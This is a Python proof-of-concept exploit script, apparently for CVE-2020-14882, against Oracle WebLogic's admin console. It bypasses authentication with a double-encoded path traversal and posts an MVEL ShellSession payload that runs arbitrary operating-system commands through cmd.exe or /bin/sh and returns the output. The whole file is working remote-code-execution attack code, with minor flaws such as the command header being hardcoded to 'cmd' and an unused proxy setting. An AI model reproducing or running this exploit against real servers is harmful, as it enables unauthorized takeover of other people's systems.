# coding:utf-8
import requests
import http.client
import argparse

http.client.HTTPConnection._http_vsn_str='HTTP/1.0'
def argument():
    parser = argparse.ArgumentParser(description='usage: python3 demo.py -u [url] -c [command]')
    parser.add_argument('-u','--url',type=str,metavar='',required=True,help='[*] Please assign vulnerable url')
    parser.add_argument('-c','--cmd',type=str,metavar='',required=True,help='[*] Please assign command')
    args = parser.parse_args()
    return args

def banner():
    print("""
 _______      ________    ___   ___ ___   ___        __ _  _   ___   ___ ___  
/ ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | || | / _ \ / _ \__ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | || || (_) | (_) | ) |
| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |__   _> _ < > _ < / / 
| |____   \  /  | |____    / /_| |_| / /_| |_| |      | |  | || (_) | (_) / /_ 
\_____|   \/   |______|  |____|\___/____|\___/       |_|  |_| \___/ \___/____|                                                                             
    """)
def Poc():
    args = argument()
    url = args.url
    cmd = args.cmd
    path = "/console/images/%252E%252E%252Fconsole.portal"

    headers={
        'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Content-Type': 'text/xml;charset=UTF-8',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,''*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cmd': 'cmd'
    }
    proxies = {
        'http':'socks://127.0.0.1:8080',
        'https':'socks:127.0.0.1:8080'}
    payload = '''_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if (cmd != null) {String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\A").next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write("");}executeThread.interrupt();')'''
    try:
        res = requests.post(url=url+path,data=payload,headers=headers,verify=False,allow_redirects=False,timeout=10)

        print("[+] Command results are as follows: ")
        print(res.text)

    except Exception as e:
        print("[-] Please Check your url and cmd！")

if __name__ == '__main__':
    banner()
    Poc()
